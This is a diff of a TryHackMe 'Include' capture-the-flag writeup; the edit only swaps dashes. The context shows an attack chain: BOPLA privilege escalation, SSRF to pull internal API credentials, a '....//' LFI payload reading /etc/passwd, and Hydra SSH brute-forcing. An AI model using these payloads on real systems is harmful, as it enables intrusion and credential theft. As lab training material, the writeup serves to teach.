@@ -1,6 +1,6 @@
 ---
 slug: "thm-include"
-title: "Include — TryHackMe Writeup"
+title: "Include - TryHackMe Writeup"
 date: "2026-07-22"
 platform: "TryHackMe"
 type: "Machine"
@@ -31,7 +31,7 @@ import { KillChain, SpoilerFlag } from "@/components/cyber/WriteupComponents";
     {
       phase: "Reconnaissance",
       title: "Port Scanning & Service Enumeration",
-      desc: "Nmap uncovered SSH (22), a full mail stack — SMTP (25), POP3 (110/995), IMAP (143/993) — a Node.js/Express app on port 4000 with guest:guest login, and a PHP System Monitoring Portal on port 50000.",
+      desc: "Nmap uncovered SSH (22), a full mail stack - SMTP (25), POP3 (110/995), IMAP (143/993) - a Node.js/Express app on port 4000 with guest:guest login, and a PHP System Monitoring Portal on port 50000.",
       tools: ["Nmap", "curl"],
     },
     {
@@ -62,7 +62,7 @@ import { KillChain, SpoilerFlag } from "@/components/cyber/WriteupComponents";
 
 ## Introduction
 
-_Include_ is a medium-rated TryHackMe Linux machine that chains together multiple web application vulnerabilities to progressively escalate access. The target runs a full mail stack alongside two distinct web applications — a **Node.js/Express** app on port 4000 and a **PHP System Monitoring Portal** on port 50000.
+_Include_ is a medium-rated TryHackMe Linux machine that chains together multiple web application vulnerabilities to progressively escalate access. The target runs a full mail stack alongside two distinct web applications - a **Node.js/Express** app on port 4000 and a **PHP System Monitoring Portal** on port 50000.
 
 The attack path flows through **Broken Object Property Level Authorization (BOPLA)** to gain admin privileges on the Node.js app, **SSRF** to exfiltrate internal API credentials, **LFI** on the monitoring portal to extract system users from `/etc/passwd`, and finally **SSH brute-forcing** with Hydra to gain a shell and locate the hidden flag.
 
@@ -72,7 +72,7 @@ The attack path flows through **Broken Object Property Level Authorization (BOPL
 
 ### Nmap Scan
 
-A full TCP port scan reveals eight listening services — including a complete mail stack:
+A full TCP port scan reveals eight listening services - including a complete mail stack:
 
 ```bash
 nmap -sC -sV -p- -T4 10.113.170.46
@@ -112,7 +112,7 @@ The scan reveals a Linux machine acting as a mail server and hosting two web app
 | **50000**              | HTTP      | Apache 2.4.41     | "System Monitoring Portal" (PHP)  |
 
 <Callout type="info">
-  The machine has a full mail stack running (Postfix + Dovecot). There are two web applications —
+  The machine has a full mail stack running (Postfix + Dovecot). There are two web applications -
   port **4000** is a Node.js login page, and port **50000** is an Apache server running PHP
   (indicated by the `PHPSESSID` cookie). Given the machine's name is "Include", port 50000 is the
   prime target for File Inclusion attacks.
@@ -130,17 +130,17 @@ Username: guest
 Password: guest
 ```
 
-Port 50000 hosts a **System Monitoring Portal** with its own login form — we'll return to this later once we have credentials.
+Port 50000 hosts a **System Monitoring Portal** with its own login form - we'll return to this later once we have credentials.
 
 ![Port 50000 System Monitoring Portal](https://i.imgur.com/UuZMkVW.png)
 
 ---
 
-## Enumeration — Port 4000 (Node.js App)
+## Enumeration - Port 4000 (Node.js App)
 
 ### Guest Login & Feature Discovery
 
-After logging in with `guest:guest`, we land on a social activity feed. Taking a tour around the application, we discover the ability to **add activities** — and more importantly, we notice some interesting details attached to our user profile:
+After logging in with `guest:guest`, we land on a social activity feed. Taking a tour around the application, we discover the ability to **add activities** - and more importantly, we notice some interesting details attached to our user profile:
 
 - `id: 1`
 - `isAdmin: false`
@@ -162,21 +162,21 @@ The request body is straightforward:
 activityType=hacker&activityName=true
 ```
 
-The critical insight: **the activity feature doesn't just add activities — it updates user profile properties directly.** If we can control the `activityType` parameter, we can overwrite _any_ property on our user object.
+The critical insight: **the activity feature doesn't just add activities - it updates user profile properties directly.** If we can control the `activityType` parameter, we can overwrite _any_ property on our user object.
 
 ---
 
-## BOPLA — Broken Object Property Level Authorization
+## BOPLA - Broken Object Property Level Authorization
 
 ### Overwriting User Properties
 
-Testing the theory — can we modify our own profile fields through the activity feature?
+Testing the theory - can we modify our own profile fields through the activity feature?
 
 ```
 activityType=age&activityName=1000
 ```
 
-It works — our age is updated to 1000.
+It works - our age is updated to 1000.
 
 ![Age updated via activity feature](https://i.imgur.com/zfow2lI.png)
 
@@ -200,14 +200,14 @@ activityType=isAdmin&activityName=true
 
 <Callout type="info">
   **BOPLA vs Prototype Pollution:** This vulnerability is distinct from prototype pollution. Here,
-  the API directly writes attacker-controlled key-value pairs onto the user object — no `__proto__`
-  chain manipulation is needed. OWASP classifies this as [API3:2023 — Broken Object Property Level
+  the API directly writes attacker-controlled key-value pairs onto the user object - no `__proto__`
+  chain manipulation is needed. OWASP classifies this as [API3:2023 - Broken Object Property Level
   Authorization](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/).
 </Callout>
 
 ---
 
-## SSRF — Internal API Credential Extraction
+## SSRF - Internal API Credential Extraction
 
 ### Discovering the Internal API
 
@@ -237,11 +237,11 @@ Response:
 }
 ```
 
-The passwords are redacted in the API documentation — but we now know the exact endpoint that holds the real credentials.
+The passwords are redacted in the API documentation - but we now know the exact endpoint that holds the real credentials.
 
 ### Exploiting SSRF via Admin Settings
 
-The `/settings` tab contains an **"Update Banner Image URL"** feature — a classic SSRF vector. Instead of providing an image URL, we feed it the internal API endpoint:
+The `/settings` tab contains an **"Update Banner Image URL"** feature - a classic SSRF vector. Instead of providing an image URL, we feed it the internal API endpoint:
 
 ![Admin settings with SSRF-vulnerable banner URL input](https://i.imgur.com/BrgqLRc.png)
 
@@ -278,7 +278,7 @@ echo 'eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbk
 
 ---
 
-## System Monitoring Portal — Flag 1
+## System Monitoring Portal - Flag 1
 
 ### Logging In to Port 50000
 
@@ -289,7 +289,7 @@ Username: administrator
 Password: S$9$qk6d#**LQU
 ```
 
-We land on the monitoring dashboard — and immediately spot the first flag:
+We land on the monitoring dashboard - and immediately spot the first flag:
 
 ![System Monitoring Portal with Flag 1](https://i.imgur.com/Lmt59Ec.png)
 
@@ -297,7 +297,7 @@ We land on the monitoring dashboard — and immediately spot the first flag:
 
 ---
 
-## LFI — Local File Inclusion
+## LFI - Local File Inclusion
 
 ### Discovering the Vulnerable Parameter
 
@@ -310,7 +310,7 @@ Host: 10.113.170.46:50000
 
 ![Strange profile.php request with img parameter in Caido](https://i.imgur.com/1qdtoiW.png)
 
-A file inclusion parameter (`img`) loading a local image file — this screams **LFI**.
+A file inclusion parameter (`img`) loading a local image file - this screams **LFI**.
 
 ### Automated LFI Fuzzing with ffuf
 
@@ -323,7 +323,7 @@ ffuf -request req -request-proto http \
   -mc 200,403,500 -t 50 -fl 1
 ```
 
-The results flood in — the `....//` traversal variant (which bypasses simple `../` stripping filters) works consistently:
+The results flood in - the `....//` traversal variant (which bypasses simple `../` stripping filters) works consistently:
 
 ```text
 ....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2231, Words: 20, Lines: 42]
@@ -335,7 +335,7 @@ The results flood in — the `....//` traversal variant (which bypasses simple `
 
 <Callout type="info">
   **Why `....//` instead of `../`?** The server likely has a filter that removes `../` sequences
-  from the input. The `....//` pattern exploits this — after the filter strips the inner `../`, what
+  from the input. The `....//` pattern exploits this - after the filter strips the inner `../`, what
   remains is `../`, which the filesystem interprets as a valid traversal. This is a classic filter
   bypass technique.
 </Callout>
@@ -367,7 +367,7 @@ Filtering for users with a login shell reveals five candidates:
 
 ---
 
-## SSH Brute Force — Shell Access
+## SSH Brute Force - Shell Access
 
 ### Building the Attack
 
@@ -386,7 +386,7 @@ Hydra cracks both target accounts quickly:
 ```
 
 <Callout type="warning">
-  Both `joshua` and `charles` use the password `123456` — the most common password in history.
+  Both `joshua` and `charles` use the password `123456` - the most common password in history.
 </Callout>
 
 ### SSH Login & Flag Hunt
@@ -403,7 +403,7 @@ joshua@ip-10-113-170-46:~$ ls
 Maildir
 ```
 
-The home directory only contains a `Maildir` folder — no flag here. Time for a targeted filesystem search:
+The home directory only contains a `Maildir` folder - no flag here. Time for a targeted filesystem search:
 
 ```bash
 find / -type f \( -name "*.txt" -o -name "*.php" -o -name "*.conf" \) 2>/dev/null \
@@ -418,7 +418,7 @@ find / -type f \( -name "*.txt" -o -name "*.php" -o -name "*.conf" \) 2>/dev/nul
 /var/www/html/505eb0fb8a9f32853b4d955e1f9123ea.txt   ← 🎯
 ```
 
-The flag is hidden in the web root with an MD5-hash filename — intentionally obscured to prevent casual discovery:
+The flag is hidden in the web root with an MD5-hash filename - intentionally obscured to prevent casual discovery:
 
 ```bash
 joshua@ip-10-113-170-46:~$ cat /var/www/html/505eb0fb8a9f32853b4d955e1f9123ea.txt
@@ -430,12 +430,12 @@ joshua@ip-10-113-170-46:~$ cat /var/www/html/505eb0fb8a9f32853b4d955e1f9123ea.tx
 
 ## References
 
-- [OWASP API3:2023 — Broken Object Property Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/)
-- [OWASP — Server-Side Request Forgery (SSRF)](https://owasp.org/www-community/attacks/Server-Side_Request_Forgery)
-- [OWASP — Path Traversal / Local File Inclusion](https://owasp.org/www-community/attacks/Path_Traversal)
-- [HackTricks — LFI to RCE Techniques](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
-- [HackTricks — SSRF Bypass Techniques](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
-- [Hydra — Network Login Cracker](https://www.kali.org/tools/hydra/)
-- [SecLists — LFI Fuzzing Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
+- [OWASP API3:2023 - Broken Object Property Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/)
+- [OWASP - Server-Side Request Forgery (SSRF)](https://owasp.org/www-community/attacks/Server-Side_Request_Forgery)
+- [OWASP - Path Traversal / Local File Inclusion](https://owasp.org/www-community/attacks/Path_Traversal)
+- [HackTricks - LFI to RCE Techniques](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
+- [HackTricks - SSRF Bypass Techniques](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
+- [Hydra - Network Login Cracker](https://www.kali.org/tools/hydra/)
+- [SecLists - LFI Fuzzing Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
 - [Linux Privilege Escalation: Enumeration & Recon](/cheatsheet/linux/privesc-enumeration)
 - [Linux Privilege Escalation: Basics & Exploitation](/cheatsheet/linux/privesc-exploitation)
